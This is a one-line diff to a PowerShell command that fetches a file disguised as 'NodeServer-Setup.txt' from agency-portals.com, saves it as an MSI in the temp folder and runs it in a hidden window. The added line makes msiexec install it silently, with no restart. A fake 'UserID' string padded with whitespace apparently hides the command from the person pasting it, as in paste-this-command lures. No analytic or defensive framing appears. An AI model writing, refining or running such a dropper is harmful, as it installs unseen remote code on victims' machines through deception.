@@ -1,1 +1,1 @@
-powershell  -WindowStyle Hidden -c "iwr 'https://agency-portals.com/NodeServer-Setup.txt' -o $env:TEMP\\tc.msi; & $env:TEMP\\tc.msi; Write-Host '                                                  UserID:63994529832'"
+powershell -WindowStyle Hidden -c "iwr 'https://agency-portals.com/NodeServer-Setup.txt' -o $env:TEMP\\tc.msi; Start-Process msiexec.exe -ArgumentList '/i \"$env:TEMP\\tc.msi\" /qn /norestart' -Wait; Write-Host '                                                  UserID:63994529832'"
